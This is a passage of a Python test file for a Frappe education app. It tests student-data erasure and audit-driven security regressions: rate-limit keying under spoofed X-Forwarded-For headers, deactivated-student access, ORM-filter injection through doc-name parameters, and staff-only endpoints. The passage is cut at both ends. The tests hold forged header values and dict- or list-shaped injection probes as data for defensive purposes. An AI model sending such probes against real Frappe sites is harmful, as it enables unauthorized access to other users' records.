		               }).insert(ignore_permissions=True)
		api.clear_content_cache()
		t = next(c for c in api._build_courses() if c["key"] == key)
		r = t["lessons"][0]["reply"][0]
		self.assertEqual(r["slots"], [])   # malformed spec → empty slots; game skips the round


class TestErasure(FrappeTestCase):
	"""Right to erasure: every row keyed on a girl leaves the database, the synthetic
	Frappe User of an online learner goes with them, and Frappe's own bookkeeping stops
	naming her.

	The audio half of this suite went with the Bhojpuri AI / Boli pipeline. The app no
	longer records anything, so there are no private media bytes for an erasure to reach;
	v12_remove_boli is what erases the recordings older builds collected."""

	def _mk_student(self, name, with_user=False):
		user = None
		if with_user:                       # an online learner also has a Frappe User
			user = name.lower().replace(" ", "-") + "@erase.hikmat.invalid"
			if not frappe.db.exists("User", user):
				frappe.get_doc({"doctype": "User", "email": user, "first_name": name,
				                "send_welcome_email": 0,
				                "user_type": "Website User"}).insert(ignore_permissions=True)

		def _rm():
			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
				for dt in api._LEARNER_DOCTYPES:
					api._erase(dt, api._erasable(dt, {"student": s}))
				frappe.db.set_value("Student", s, "user", None, update_modified=False)
				frappe.delete_doc("Student", s, force=1, ignore_permissions=True,
				                  delete_permanently=True)
				frappe.db.commit()
			api._erase_student_user(user)
			frappe.db.commit()
		self.addCleanup(_rm)
		return frappe.get_doc({"doctype": "Student", "student_name": name, "active": 1,
		                       "gender": "Female", "user": user}).insert(ignore_permissions=True)

	def _seed_trail(self, girl):
		"""One row in each learner table that a plain fixture can create, so the test
		fails if a table is ever dropped from api._LEARNER_DOCTYPES."""
		frappe.get_doc({"doctype": "Lesson Attempt", "student": girl.name,
		                "student_name": girl.student_name, "track": "t1", "lesson": "l1",
		                "activity": "learn", "stars": 2, "coins": 20,
		                "attempted_on": frappe.utils.now()}).insert(ignore_permissions=True)
		frappe.get_doc({"doctype": "Lesson Doubt", "student": girl.name,
		                "student_name": girl.student_name, "track": "t1", "lesson": "l1",
		                "activity": "learn", "question": "समझ नहीं आया", "resolved": 0,
		                "raised_on": frappe.utils.now()}).insert(ignore_permissions=True)
		milestone = frappe.get_all("Hikmat Milestone", limit=1, pluck="name")
		if milestone:                       # facilitator free text ABOUT the child
			frappe.get_doc({"doctype": "Evaluation", "student": girl.name,
			                "student_name": girl.student_name, "milestone": milestone[0],
			                "status": "Pending", "rubric_notes": "notes about the child",
			                }).insert(ignore_permissions=True)
		frappe.db.commit()

	def test_delete_student_erases_her_whole_trail_and_her_user(self):
		girl = self._mk_student("Erase Rows Girl", with_user=True)
		peer = self._mk_student("Erase Rows Peer")
		self._seed_trail(girl)
		self._seed_trail(peer)

		self.assertTrue(api.delete_student(girl.name).get("ok"))

		for dt in api._LEARNER_DOCTYPES:
			self.assertEqual(frappe.db.count(dt, {"student": girl.name}), 0, dt)
		self.assertFalse(frappe.db.exists("Student", girl.name))
		self.assertFalse(frappe.db.exists("User", girl.user))
		# erasing one child costs another one nothing
		self.assertTrue(frappe.db.exists("Student", peer.name))
		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": peer.name}), 1)

	def test_delete_student_is_rerunnable(self):
		girl = self._mk_student("Erase Twice Girl")
		self._seed_trail(girl)
		self.assertTrue(api.delete_student(girl.name).get("ok"))
		# a retried erasure must not throw; the girl is simply already gone
		self.assertFalse(api.delete_student(girl.name).get("ok"))
		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": girl.name}), 0)

	def test_a_half_finished_erasure_is_resumed_not_refused(self):
		"""An older run (or an interrupted one) can leave rows behind with the Student row
		already gone. _erasure_residue is what lets delete_student finish that job instead
		of answering not_found and abandoning the data forever."""
		girl = self._mk_student("Erase Resume Girl")
		self._seed_trail(girl)
		frappe.delete_doc("Student", girl.name, force=1, ignore_permissions=True,
		                  delete_permanently=True)
		frappe.db.commit()
		self.assertTrue(api._erasure_residue(girl.name))

		out = api.delete_student(girl.name)
		self.assertTrue(out.get("ok"), out)
		self.assertTrue(out.get("resumed"))
		self.assertFalse(api._erasure_residue(girl.name))

	def test_erasure_scrubs_the_plaintext_name_residue(self):
		""""ALL her data" includes Frappe's own bookkeeping. Its delete feed writes
		comment_type='Deleted', subject='<DocType> <name>' with a NULL reference_name (so its
		own cleanup can never match it), a cascaded Notification Settings is archived in
		Deleted Document as JSON, and a DefaultValue stays keyed on her user id."""
		girl = self._mk_student("Erase Residue Girl", with_user=True)
		doubt = frappe.get_doc({"doctype": "Lesson Doubt", "student": girl.name,
		                        "student_name": girl.student_name, "track": "t1",
		                        "lesson": "l1", "activity": "learn", "question": "मदद",
		                        "resolved": 0, "raised_on": frappe.utils.now()
		                        }).insert(ignore_permissions=True)
		api._notify_facilitators("bell naming " + girl.student_name, "Lesson Doubt", doubt.name)
		frappe.db.commit()
		user = girl.user

		self.assertTrue(api.delete_student(girl.name).get("ok"))

		for ident in (girl.name, doubt.name):
			self.assertFalse(frappe.get_all("Comment", filters={
				"comment_type": "Deleted", "subject": ("like", "%" + ident)}, limit=1),
				"delete-feed comment still names " + ident)
		self.assertFalse(frappe.get_all("Deleted Document",
		                                filters={"deleted_name": user}, limit=1))
		self.assertFalse(frappe.get_all("DefaultValue", filters={"parent": user}, limit=1))
		self.assertFalse(frappe.get_all("Notification Log",
		                                filters={"document_name": doubt.name}, limit=1))
		self.assertFalse(frappe.get_all("DocShare", filters={"user": user}, limit=1))


# ---------------------------------------------------------------------------
# Security regressions (audit 2026-07-28): H1 rate-limit key/window/failure mode,
# M1 deactivated-student access, M3 ORM-filter injection through doc-name params.
# ---------------------------------------------------------------------------
def _fake_request(xff=None, peer="203.0.113.7"):
	"""A minimal werkzeug request so _client_ip() can be exercised without a server.
	`xff` may be a list to send SEVERAL X-Forwarded-For headers (one chain, RFC 7230)."""
	from werkzeug.test import EnvironBuilder
	from werkzeug.wrappers import Request
	b = EnvironBuilder(path="/api/method/x", environ_base={"REMOTE_ADDR": peer})
	if isinstance(xff, (list, tuple)):
		for v in xff:
			b.headers.add("X-Forwarded-For", v)
	elif xff is not None:
		b.headers["X-Forwarded-For"] = xff
	return Request(b.get_environ())


_KEEP = object()      # sentinel: "leave the site's own trusted-proxy config alone"


def _use_trusted_proxies(value=_KEEP):
	"""Set frappe.conf["hikmat_trusted_proxies"] for one test; returns a restore callable.
	`value=None` DELETES the key, i.e. exercises the zero-config default. The dev site config
	sets it to [] (trust nobody), so any test that needs a trusted peer must say so here."""
	had = "hikmat_trusted_proxies" in frappe.conf
	old = frappe.conf.get("hikmat_trusted_proxies")

	def _restore():
		if had:
			frappe.conf["hikmat_trusted_proxies"] = old
		else:
			frappe.conf.pop("hikmat_trusted_proxies", None)

	if value is not _KEEP:
		if value is None:
			frappe.conf.pop("hikmat_trusted_proxies", None)
		else:
			frappe.conf["hikmat_trusted_proxies"] = value
	return _restore


class TestRateLimitKeyAndWindow(FrappeTestCase):
	"""H1: every per-IP ceiling in the app used to be keyed on the FIRST X-Forwarded-For
	token — pure client input — so a flood minted a fresh bucket per request; the window
	was re-armed on every hit so it never closed; and the limiter failed open everywhere,
	including on pre-auth signup. These tests pin the key, the window and BOTH failure
	modes. Buckets live in shared Redis, so every one is reset on the way out and the test
	IPs are documentation-only ranges that real traffic can never produce."""

	def _use_request(self, xff=None, peer="203.0.113.7", trusted=_KEEP):
		"""Install a fake request (+ optional trusted-proxy set) for one test."""
		old_req = getattr(frappe.local, "request", None)
		restore_conf = _use_trusted_proxies(trusted)

		def _restore():
			frappe.local.request = old_req
			restore_conf()

		self.addCleanup(_restore)
		frappe.local.request = _fake_request(xff, peer)

	def _bucket(self, name):
		self.addCleanup(api._rate_reset, name)
		api._rate_reset(name)
		return name

	def test_client_ip_trusts_the_header_only_from_a_trusted_peer(self):
		"""The trusted-PROXY model (it replaced a hop COUNT, which was wrong in both
		directions and undetectably so — see api._DEFAULT_TRUSTED_PROXIES).

		`peer` is the socket peer, the one address nobody can forge. When it is a trusted
		proxy we walk X-Forwarded-For right-to-left (nginx APPENDS) past our own proxies and
		take the first untrusted entry; when it is not, the header is ignored entirely."""
		LOOPBACK = ["127.0.0.1"]
		for label, xff, peer, trusted, want in (
			# --- peer is NOT a trusted proxy: the header is pure client input, ignored ---
			("direct exposure, spoof ignored", "1.2.3.4", "203.0.113.7", [], "203.0.113.7"),
			("direct exposure, deep spoof", "9.9.9.1, 9.9.9.2, 203.0.113.9", "203.0.113.7", [], "203.0.113.7"),
			("public peer is never trusted by default", "1.2.3.4", "203.0.113.7", None, "203.0.113.7"),
			# --- peer IS a trusted proxy: rightmost UNtrusted entry is the real client ---
			("nginx on localhost", "203.0.113.9, 127.0.0.1", "127.0.0.1", None, "203.0.113.9"),
			("spoofed prefix changes nothing", "1.2.3.4, 203.0.113.9, 127.0.0.1", "127.0.0.1", None, "203.0.113.9"),
			("nginx appends nothing (one entry)", "203.0.113.9", "127.0.0.1", LOOPBACK, "203.0.113.9"),
			("two proxies of ours", "203.0.113.9, 10.0.0.5, 192.168.1.1", "127.0.0.1", None, "203.0.113.9"),
			("blank entries", " , ,1.2.3.4 , , 203.0.113.9 , 127.0.0.1 ,", "127.0.0.1", LOOPBACK, "203.0.113.9"),
			("several XFF headers = ONE chain", ["1.2.3.4", "203.0.113.9, 127.0.0.1"], "127.0.0.1", LOOPBACK, "203.0.113.9"),
			("IPv6 client", "2001:db8::1, 127.0.0.1", "127.0.0.1", LOOPBACK, "2001:db8::1"),
			("IPv6 in brackets + port", "[2001:db8::1]:443, 127.0.0.1", "127.0.0.1", LOOPBACK, "2001:db8::1"),
			("IPv6 re-spelled", "2001:0DB8:0000::0:1, 127.0.0.1", "127.0.0.1", LOOPBACK, "2001:db8::1"),
			("IPv4 with a port", "198.51.100.9:51234, 127.0.0.1", "127.0.0.1", LOOPBACK, "198.51.100.9"),
			("IPv4-mapped loopback is loopback", "203.0.113.9, ::ffff:127.0.0.1", "127.0.0.1", None, "203.0.113.9"),
			("CIDR-configured CDN egress", "203.0.113.9, 198.51.100.7", "198.51.100.7",
			 ["198.51.100.0/24"], "203.0.113.9"),
			# --- nothing usable in the chain → the peer, which is always safe ---
			("no header at all", None, "127.0.0.1", None, "127.0.0.1"),
			("empty header", "", "127.0.0.1", None, "127.0.0.1"),
			("every entry is a trusted proxy", "10.1.2.3, 192.168.5.6", "127.0.0.1", None, "127.0.0.1"),
			("unreadable rightmost entry", "203.0.113.9, unknown", "127.0.0.1", None, "127.0.0.1"),
			("trusted peer, junk-only chain", "gibberish", "127.0.0.1", None, "127.0.0.1"),
		):
			with self.subTest(label):
				old = getattr(frappe.local, "request", None)
				restore = _use_trusted_proxies(trusted)
				frappe.local.request = _fake_request(xff, peer)
				try:
					self.assertEqual(api._client_ip(), want)
				finally:
					frappe.local.request = old
					restore()

	def test_a_spoofed_header_cannot_move_the_bucket_on_a_directly_exposed_site(self):
		"""The original exploit, re-pinned at the level that matters: 20 requests, 20 different
		spoofed headers, ONE bucket — because the socket peer is what counts. Proven over HTTP
		against the running bench too (that is how the login lockout was being bypassed)."""
		self._use_request(peer="203.0.113.7", trusted=[])
		c = api._rl_cache()
		pat = c.make_key(api._RL_PREFIX + "t-nospoof:").decode() + "*"
		for k in c.keys(pat):
			c.delete(k)
		self.addCleanup(api._rate_reset, "t-nospoof:203.0.113.7")
		for i in range(20):
			frappe.local.request = _fake_request("10.9.%d.%d, 198.51.100.%d" % (i, i, i), "203.0.113.7")
			api._rate_ok("t-nospoof:" + api._client_ip(), 6000, 3600)
		self.assertEqual(len(c.keys(pat)), 1)
		self.assertEqual(api._rate_state("t-nospoof:203.0.113.7")[0], 20)

	def test_an_undiagnosable_proxy_chain_is_logged(self):
		"""Silence is what made the old hop count dangerous, so the one case the app cannot
		resolve — a trusted peer whose whole chain is trusted (or unreadable) — must SAY so,
		naming the config key. Logged at ERROR because frappe drops .warning() off a dev
		server (default_log_level), which is exactly where an operator would need it."""
		from unittest.mock import patch
		for xff in ("10.1.2.3, 192.168.5.6", "127.0.0.1", "203.0.113.9, junk"):
			with self.subTest(xff):
				self._use_request(xff, peer="127.0.0.1", trusted=None)
				frappe.local._hikmat_conf_warned = set()
				with patch.object(frappe, "logger") as lg:
					self.assertEqual(api._client_ip(), "127.0.0.1")     # falls back to the peer
					msgs = " ".join(str(c) for c in lg.return_value.error.call_args_list)
				self.assertIn("hikmat_trusted_proxies", msgs)
				self.assertIn("one bucket", msgs)
		frappe.local._hikmat_conf_warned = set()

	def test_the_obsolete_hop_count_is_reported_not_silently_ignored(self):
		"""A site that still carries `hikmat_trusted_proxy_hops` is misconfigured in a way
		only the app can see: the key now does nothing at all."""
		from unittest.mock import patch
		had = "hikmat_trusted_proxy_hops" in frappe.conf
		prev = frappe.conf.get("hikmat_trusted_proxy_hops")
		self.addCleanup(lambda: frappe.conf.__setitem__("hikmat_trusted_proxy_hops", prev)
		                if had else frappe.conf.pop("hikmat_trusted_proxy_hops", None))
		frappe.conf["hikmat_trusted_proxy_hops"] = 2
		frappe.local._hikmat_conf_warned = set()
		with patch.object(frappe, "logger") as lg:
			api._trusted_proxies()
			msgs = " ".join(str(c) for c in lg.return_value.error.call_args_list)
		self.assertIn("hikmat_trusted_proxy_hops", msgs)
		self.assertIn("OBSOLETE", msgs)
		frappe.local._hikmat_conf_warned = set()

	def test_a_junk_cidr_in_the_config_is_reported_and_ignored(self):
		from unittest.mock import patch
		self._use_request("203.0.113.9, 127.0.0.1", peer="127.0.0.1",
		                  trusted=["127.0.0.1", "not-an-ip", "10.0.0.0/99"])
		frappe.local._hikmat_conf_warned = set()
		with patch.object(frappe, "logger") as lg:
			self.assertEqual(api._client_ip(), "203.0.113.9")   # the good entry still works
			msgs = " ".join(str(c) for c in lg.return_value.error.call_args_list)
		self.assertIn("not-an-ip", msgs)
		frappe.local._hikmat_conf_warned = set()

	def test_norm_ip_folds_an_ipv4_mapped_address(self):
		"""The docstring used to CLAIM this; ipaddress does not do it, so it is done by hand.
		Two spellings of one host must never be two buckets, and ::ffff:127.0.0.1 has to be
		recognised as loopback by the trusted-proxy test."""
		self.assertEqual(api._norm_ip("::ffff:1.2.3.4"), "1.2.3.4")
		self.assertEqual(api._norm_ip("[::ffff:127.0.0.1]:8000"), "127.0.0.1")
		self.assertEqual(api._norm_ip("2001:DB8:0::0:1"), "2001:db8::1")     # still canonicalised
		self.assertEqual(api._norm_ip("unknown"), "")
		restore = _use_trusted_proxies(None)                  # the zero-config default set
		self.addCleanup(restore)
		nets = api._trusted_proxies()
		self.assertTrue(api._is_trusted_proxy(api._norm_ip("::ffff:10.0.0.9"), nets))
		self.assertTrue(api._is_trusted_proxy(api._norm_ip("::ffff:127.0.0.1"), nets))
		self.assertFalse(api._is_trusted_proxy(api._norm_ip("203.0.113.9"), nets))
		self.assertFalse(api._is_trusted_proxy("", nets))

	def test_spoofed_xff_values_share_one_bucket(self):
		# the exploit: 5 requests, 5 different spoofed first tokens, previously 5 buckets
		# each at count 1. Now they all land in the ONE bucket our proxy vouches for.
		c = api._rl_cache()
		pat = c.make_key(api._RL_PREFIX + "t-spoof:").decode() + "*"
		for k in c.keys(pat):
			c.delete(k)
		self.addCleanup(api._rate_reset, "t-spoof:203.0.113.7")
		old = getattr(frappe.local, "request", None)
		self.addCleanup(lambda: setattr(frappe.local, "request", old))
		for i in range(1, 6):
			frappe.local.request = _fake_request("10.9.9.%d, 203.0.113.7" % i)
			self.assertTrue(api._rate_ok("t-spoof:" + api._client_ip(), 60, 3600))
		self.assertEqual(len(c.keys(pat)), 1)                       # one bucket, not five
		self.assertEqual(api._rate_state("t-spoof:203.0.113.7")[0], 5)

	def test_window_is_fixed_and_never_re_armed(self):
		# the old limiter re-set the TTL on every hit, so a client hitting faster than the
		# window kept its own block alive forever. Assert the TTL instead of sleeping:
		# shrink it to simulate a nearly-elapsed window, then hit again.
		b = self._bucket("t-window")
		self.assertTrue(api._rate_ok(b, 10, 3600))
		c = api._rl_cache()
		c.expire(c.make_key(api._RL_PREFIX + b), 25)
		for _ in range(4):
			self.assertTrue(api._rate_ok(b, 10, 3600))
		count, ttl = api._rate_state(b)
		self.assertEqual(count, 5)                                  # hits still counted
		self.assertLessEqual(ttl, 25)                               # window NOT pushed out
		self.assertGreater(ttl, 0)

	def test_ceiling_admits_exactly_limit_then_releases(self):
		b = self._bucket("t-ceiling")
		self.assertEqual([api._rate_ok(b, 3, 3600) for _ in range(5)],
		                 [True, True, True, False, False])          # unchanged ceiling
		api._rate_reset(b)                                          # window expires
		self.assertTrue(api._rate_ok(b, 3, 3600))                   # and the block lifts

	def test_missing_limiter_fails_open_by_default_closed_when_asked(self):
		from unittest.mock import patch
		with patch.object(api, "_rl_cache", side_effect=RuntimeError("redis down")):
			frappe.local._hikmat_rl_warned = False
			self.assertTrue(api._rate_ok("t-dead", 1, 60))               # lessons keep working
			frappe.local._hikmat_rl_warned = False
			self.assertFalse(api._rate_ok("t-dead", 1, 60, fail_closed=True))
		frappe.local._hikmat_rl_warned = False

	def test_limiter_outage_refuses_signup_but_not_a_lesson_write(self):
		"""The availability call: a Redis outage must not brick a classroom on 2G, so only
		the destructive PRE-AUTH paths fail closed. Signup (mints a Student + a 90-day
		token) is refused; the girl's lesson writes still land."""
		from unittest.mock import patch

		def _rm():
			frappe.db.delete("Learning Event", {"client_id": "t-avail-ev"})
			frappe.db.delete("Lesson Attempt", {"client_id": "t-avail-att"})
			for s in frappe.get_all("Student", filters={"student_name": (
					"in", ["Outage Lesson Girl", "Outage Signup Girl"])}, pluck="name"):
				frappe.db.delete("Student", {"name": s})
			frappe.db.commit()

		self.addCleanup(_rm)
		stu = frappe.get_doc({"doctype": "Student", "student_name": "Outage Lesson Girl",
		                      "active": 1, "gender": "Other"}).insert(ignore_permissions=True)
		tok = api._token_for(stu.name)
		frappe.db.commit()
		with patch.object(api, "_rl_cache", side_effect=RuntimeError("redis down")):
			frappe.local._hikmat_rl_warned = False
			signup = api.signup_student(name="Outage Signup Girl", pin="1234")
			frappe.local._hikmat_rl_warned = False
			event = api.log_event(student=stu.name, token=tok, kind="dwell", duration_secs=9,
			                      track="t", lesson="l", activity="word",
			                      client_id="t-avail-ev")
			frappe.local._hikmat_rl_warned = False
			attempt = api.submit_attempt(student=stu.name, token=tok, track="t", lesson="l",
			                             activity="word", stars=2, score=1, total=1,
			                             client_id="t-avail-att")
		frappe.local._hikmat_rl_warned = False
		self.assertEqual(signup.get("error"), "rate_limited")       # fail CLOSED
		self.assertFalse(frappe.db.exists("Student", {"student_name": "Outage Signup Girl"}))
		self.assertTrue(event.get("ok"), event)                     # fail OPEN — she keeps learning
		self.assertTrue(attempt.get("ok"), attempt)

	def test_a_class_of_thirty_behind_one_ip_is_not_locked_out(self):
		"""The reason the ceilings are NOT tightened: a whole classroom NATs to one public
		IP, so a busy hour must stay far under every limit. 30 girls × (12 activities +
		20 analytics events + 12 attendance pings)."""
		# classroom NAT → one WAN IP, seen through our own nginx on localhost
		self._use_request("192.168.1.50, 203.0.113.77", peer="127.0.0.1", trusted=None)
		ip = api._client_ip()
		self.assertEqual(ip, "203.0.113.77")
		for b in ("submit:" + ip, "event:" + ip, "att:" + ip):
			self._bucket(b)
		refused = []
		for girl in range(30):
			for _ in range(12):
				if not api._rate_ok("submit:" + ip, 3000, 3600):
					refused.append("submit")
			for _ in range(20):
				if not api._rate_ok("event:" + ip, 6000, 3600):
					refused.append("event")
			for _ in range(12):
				if not api._rate_ok("att:" + ip, 2000, 3600):
					refused.append("att")
		self.assertEqual(refused, [])
		self.assertEqual(api._rate_state("submit:" + ip)[0], 360)
		self.assertEqual(api._rate_state("event:" + ip)[0], 600)
		self.assertEqual(api._rate_state("att:" + ip)[0], 360)


class TestDeactivatedStudent(FrappeTestCase):
	"""M1: `active` is the facilitator's offboarding lever, but only one endpoint
	checked it — so a deactivated girl's cached token still worked for up to 90 days on
	every other endpoint. The check now lives in the shared auth path, so all of them
	inherit it."""

	def _mk_student(self, name, with_user=False):
		user = None
		if with_user:
			user = name.lower().replace(" ", "-") + "@inactive.hikmat.invalid"
			if not frappe.db.exists("User", user):
				frappe.get_doc({"doctype": "User", "email": user, "first_name": name,
				                "send_welcome_email": 0,
				                "user_type": "Website User"}).insert(ignore_permissions=True)

		def _rm():
			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
				frappe.db.delete("Learning Event", {"student": s})
				frappe.db.delete("Lesson Attempt", {"student": s})
				frappe.db.delete("Student", {"name": s})
			if user and frappe.db.exists("User", user):
				frappe.delete_doc("User", user, force=1, ignore_permissions=True)
			frappe.db.commit()

		self.addCleanup(_rm)
		doc = frappe.get_doc({"doctype": "Student", "student_name": name, "active": 1,
		                      "gender": "Female", "user": user}).insert(ignore_permissions=True)
		return doc, api._token_for(doc.name)

	def test_deactivating_a_student_cuts_off_her_device(self):
		girl, gtok = self._mk_student("Switched Off Girl")
		peer, ptok = self._mk_student("Still On Girl")
		frappe.db.commit()
		# baseline: while active her cached token is accepted everywhere
		self.assertTrue(api._authorized(girl.name, gtok))
		self.assertTrue(api.submit_attempt(student=girl.name, token=gtok, track="t",
		                                   lesson="l", activity="word", stars=1,
		                                   client_id="t-m1-att0").get("ok"))

		frappe.db.set_value("Student", girl.name, "active", 0, update_modified=False)
		frappe.db.commit()

		self.assertFalse(api._authorized(girl.name, gtok))   # shared auth path refuses her
		self.assertFalse(api._token_ok(girl.name, gtok))     # ...even the raw token check
		# the lesson endpoints screen `active` themselves and must keep saying so, because
		# the client treats unknown_student as PERMANENT (drop) and auth as "re-login" —
		# both stop the device, neither leaves a write spinning in the outbox forever.
		self.assertEqual(api.submit_attempt(student=girl.name, token=gtok, track="t",
		                                    lesson="l", activity="word", stars=1,
		                                    client_id="t-m1-att").get("error"),
		                 "unknown_student")
		self.assertEqual(api.log_event(student=girl.name, token=gtok, kind="dwell",
		                               duration_secs=5, track="t", lesson="l",
		                               activity="word", client_id="t-m1-ev").get("error"),
		                 "unknown_student")
		# and her progress stops being readable with that token at all
		self.assertEqual(api.get_progress(student=girl.name, token=gtok), {"progress": {}})
		# nothing about the deactivation touched the girl still on the roster
		self.assertTrue(api._authorized(peer.name, ptok))

	def test_deactivated_online_session_no_longer_resolves(self):
		"""The session twin of the same hole: an ONLINE learner authenticates by her live
		Frappe session, not a token, so _session_student()'s active=1 filter is what cuts
		her off. Pinned here so nobody drops it as redundant."""
		girl, _ = self._mk_student("Session Off Girl", with_user=True)
		old_user = frappe.session.user
		self.addCleanup(lambda: setattr(frappe.session, "user", old_user))
		frappe.session.user = girl.user
		self.assertEqual(api._session_student(), girl.name)
		self.assertTrue(api._authorized(girl.name, None))    # session proof, no token
		frappe.db.set_value("Student", girl.name, "active", 0, update_modified=False)
		frappe.db.commit()
		self.assertIsNone(api._session_student())
		self.assertFalse(api._authorized(girl.name, None))
		self.assertEqual(api.get_progress(), {"progress": {}})


class TestDocNameCoercion(FrappeTestCase):
	"""M3: Frappe's whitelist layer passes JSON values straight through, and
	frappe.db.get_value(doctype, {...}) treats a dict as a FILTER — so
	clip={"status": "in_verification"} made the server pick and stream a clip the caller
	never named, bypassing the queue's own-clip / already-seen exclusions. Doc-name params
	are now coerced to scalars (or rejected)."""


	def _mk_student(self, name):
		def _rm():
			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
				frappe.db.delete("Learning Event", {"student": s})
				frappe.db.delete("Lesson Attempt", {"student": s})
				frappe.db.delete("Student", {"name": s})
			frappe.db.commit()

		self.addCleanup(_rm)
		doc = frappe.get_doc({"doctype": "Student", "student_name": name, "active": 1,
		                      "gender": "Female"}).insert(ignore_permissions=True)
		return doc, api._token_for(doc.name)

	def test_docname_keeps_scalars_and_rejects_containers(self):
		self.assertEqual(api._docname("  ABC-1 "), "ABC-1")
		self.assertEqual(api._docname(7), "7")                      # numeric autoname via JSON
		self.assertEqual(api._docname("x" * 200), "x" * 140)        # capped at the Link width
		for bad in ({"status": "in_verification"}, ["in", ["a", "b"]], ("a",), {"a"},
		            True, False, None, b"abc", object()):
			self.assertEqual(api._docname(bad), "", repr(bad))

	def test_dict_ids_are_rejected_instead_of_resolving(self):
		"""The proven exploit shape: name no document, hand the server a FILTER and let it
		choose one. It was found on an endpoint that has since been removed, but the
		primitive is generic — every whitelisted argument arrives as
		parsed JSON, so a dict reaching frappe.db.get_value/exists is an ORM filter. These
		are the surviving sinks; a regression here is another IDOR."""
		girl, gtok = self._mk_student("Filter Probe Girl")
		probe_a, ptok = self._mk_student("Filter Probe Attacker")
		api.submit_attempt(student=girl.name, token=gtok, track="t", lesson="l",
		                   activity="word", stars=3, client_id="t-m3-att")
		frappe.db.commit()

		self.addCleanup(lambda: (frappe.db.delete("Learning Event",
		                                          {"client_id": ("like", "t-m3-ev%")}),
		                         frappe.db.commit()))
		for i, probe in enumerate(({"active": 1}, ["in", [girl.name]], {"name": girl.name})):
			with self.subTest(repr(probe)):
				# reads: no id named → falls through to "no student", never her row
				self.assertEqual(api.get_progress(student=probe, token=gtok), {"progress": {}})
				# an authenticated write is refused outright
				self.assertEqual(api.submit_attempt(student=probe, token=ptok, track="t",
				                                    lesson="l", activity="word", stars=3,
				                                    client_id="t-m3-p1").get("error"),
				                 "unknown_student")
				# log_event ALLOWS guests, so the coerced-away id is not an error — it is a
				# row attributed to NOBODY. That is the property that matters: the filter
				# must never resolve to a real girl and file her classmate's event as hers.
				ev = api.log_event(student=probe, token=ptok, kind="dwell", duration_secs=5,
				                   track="t", lesson="l", activity="word",
				                   client_id="t-m3-ev%d" % i)
				self.assertTrue(ev.get("ok"), ev)
				self.assertIsNone(frappe.db.get_value("Learning Event", ev["name"], "student"))
		# her trail is exactly what she recorded — no probe wrote against her
		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": girl.name}), 1)
		self.assertEqual(frappe.db.count("Learning Event", {"student": girl.name}), 0)
		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": probe_a.name}), 0)

	def test_container_valued_ids_cannot_widen_a_lookup(self):
		"""client_id is a dedup FILTER value, so a list there is an ORM operator spec and
		would hand back a STRANGER's row as this girl's "dedup" hit — an answer the client
		then treats as "already saved" and drops."""
		girl, gtok = self._mk_student("Filter Widen Girl")
		peer, ptok = self._mk_student("Filter Widen Peer")
		first = api.submit_attempt(student=girl.name, token=gtok, track="t", lesson="l",
		                           activity="word", stars=2, client_id="t-m3b-att")
		self.assertTrue(first.get("ok"), first)
		frappe.db.commit()

		r = api.submit_attempt(student=peer.name, token=ptok, track="t", lesson="l",
		                       activity="word", stars=1, client_id=["like", "%"])
		self.assertFalse(r.get("dedup"))              # did NOT match the other girl's row
		self.assertTrue(r.get("ok"), r)               # it fell through and saved her own
		self.assertNotEqual(r.get("name"), first.get("name"))
		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": girl.name}), 1)
		self.assertEqual(frappe.db.count("Lesson Attempt", {"student": peer.name}), 1)
		# the coerced client_id is stored as NULL rather than as the container's repr
		self.assertIsNone(frappe.db.get_value("Lesson Attempt", r["name"], "client_id"))

class TestStaffOnlyEndpoints(FrappeTestCase):
	"""The destructive / credential-bearing endpoints are STAFF-ONLY, and
	`@frappe.whitelist()` without allow_guest does not make them so — it refuses exactly
	one user, Guest. Every ONLINE learner here is a real Frappe Website User
	(_create_online_user), so before _require_staff() existed an ordinary signed-in girl
	could POST delete_student and permanently erase a classmate (proven over HTTP as
	v1attacker@students.hikmat.invalid, roles [], on 2026-07-28) or revoke_student_token to
	lock her out of an offline laptop she may not be able to re-login to for days.

	These tests pin all three audiences for every re-gated endpoint — Website User cannot,
	Guest cannot, System Manager can — and assert that a REFUSED call changed nothing."""

	LEARNER = "staffgate.learner@" + api._ONLINE_EMAIL_DOMAIN

	def setUp(self):
		# belt: never leak a switched session into the next test, even if one raises
		self.addCleanup(frappe.set_user, "Administrator")

	def _mk_student(self, name, **kw):
		def _rm():
			frappe.set_user("Administrator")          # cleanup must never run as a learner
			for s in frappe.get_all("Student", filters={"student_name": name}, pluck="name"):
				frappe.db.delete("Student", {"name": s})
			frappe.db.commit()

		self.addCleanup(_rm)
		return frappe.get_doc(dict({"doctype": "Student", "student_name": name, "active": 1,
		                            "gender": "Female"}, **kw)).insert(ignore_permissions=True)

	def _learner_user(self):
		"""An ordinary online learner: an enabled Website User with NO roles — the exact
		session shape the verifier used. Returns the email, ready for frappe.set_user()."""
		if not frappe.db.exists("User", self.LEARNER):
			u = frappe.get_doc({"doctype": "User", "email": self.LEARNER,
			                    "first_name": "Staff Gate Learner", "user_type": "Website User",
			                    "enabled": 1, "send_welcome_email": 0})
			u.flags.no_welcome_mail = True
			u.insert(ignore_permissions=True)
			frappe.db.commit()

		def _rm_user():
			frappe.set_user("Administrator")          # stop being her before deleting her
			if frappe.db.exists("User", self.LEARNER):
				frappe.delete_doc("User", self.LEARNER, force=1, ignore_permissions=True)
			frappe.db.commit()

		self.addCleanup(_rm_user)
		return self.LEARNER

	def test_is_staff_fails_closed_for_every_non_staff_session(self):
		# the confusion the old comments encoded: "logged in" is not "authorized"
		self.assertTrue(api._is_staff())                       # the suite runs as Administrator
		frappe.set_user("Guest")
		self.assertFalse(api._is_staff())
		frappe.set_user(self._learner_user())
		self.assertNotIn(api._STAFF_ROLE, frappe.get_roles())   # a learner holds no staff role
		self.assertFalse(api._is_staff())

	def test_website_user_cannot_delete_a_student(self):
		victim = self._mk_student("Staff Gate Victim Girl")
		frappe.db.commit()
		frappe.set_user(self._learner_user())
		self.assertRaises(frappe.PermissionError, api.delete_student, victim.name)
		frappe.set_user("Administrator")
		self.assertTrue(frappe.db.exists("Student", victim.name))   # the child still exists

	def test_website_user_cannot_revoke_a_students_token(self):
		girl = self._mk_student("Staff Gate Token Girl")
		tok = api._token_for(girl.name)
		frappe.db.commit()
		frappe.set_user(self._learner_user())
